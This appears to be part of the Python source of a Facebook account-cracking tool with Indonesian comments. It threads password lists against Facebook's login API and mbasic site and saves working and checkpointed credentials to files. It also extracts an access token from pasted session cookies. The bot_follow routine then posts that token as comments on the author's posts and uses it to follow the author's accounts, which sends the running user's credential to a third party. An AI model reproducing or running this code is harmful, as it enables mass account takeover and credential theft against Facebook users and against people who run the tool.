    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("Hasil/OK-"+durasi+".txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("Hasil/CP-"+durasi+".txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37m[CRACKING]\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="Y" or f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="N" or f=="n":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("Hasil/OK-"+durasi+".txt.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"0"+k+"]"+p+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
#    defaultua()
    Get_Ua()
    log_token()
  elif sek=="2":
 #   defaultua()
    Get_Ua()
    gen()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ua_me.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()
def log_token():
    os.system("clear")
    banner()
    print("You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...")
    print("LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        print("You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...")
        print("LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies: ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil      = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
        except [KeyError,IOError]:
            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid"))
            os.system("clear")
            logs()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()

### BOT FOLLOW ### Jangan Diganti Anjing !!!

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	jalan(c+"Tunggu Sebentar..."+q)
	jalan(c+"Your Name   : "+k+nama)
	jalan(c+"Your ID     : "+k+id)
	# 120338706765807 #
	post1 = ('4111450325629072') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("128437652759023") # Fb Kang Reocder
	post7 = ("103017691967686")
	kom = pilih(["Lihatlah Logo Buatan Bang @[100063690353340:0]\nhttps://www.facebook.com/100067783659018/posts/103017691967686/?substory_index=0&app=fbl\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl\nhttps://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl\nhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl", "Lihatlah Logo Buatan Bang @[100063690353340:0]\nhttps://www.facebook.com/100067783659018/posts/103017691967686/?substory_index=0&app=fbl\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl\nhttps://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl\nhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl"])
	reac = pilih(["LIKE", "HAHA"])
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)
	time.sleep(1.75)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom + '&access_token=' + token)
	time.sleep(1.75)
	requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom + '&access_token=' + token)
	requests.post('https://graph.facebook.com/'+post1+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post3+'/reactions?type=' +reac+ '&access_token='+ token)
	time.sleep(1.75)
	requests.post('https://graph.facebook.com/'+post4+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post5+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post6+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post7+'/reactions?type=' +reac+ '&access_token='+ token)
	time.sleep(1.75)
	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket) ### FB HAKIKI
	requests.post('https://graph.facebook.com/100017553167451/subscribers?access_token=' + toket) ### FB HAKIKI
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
	print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
	time.sleep(2)
	menu()
def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack -- Hasil Crack"+k+" ]"+p))
    print((h+"\n[ "+p+"OK"+h+" ]"+p))
    try:
        os.system("cat Hasil/OK*.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat Hasil/CP*.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
class risky:
        os.system("git pull")
        country()


if __name__=="__main__":
        os.system("git pull")
        country()
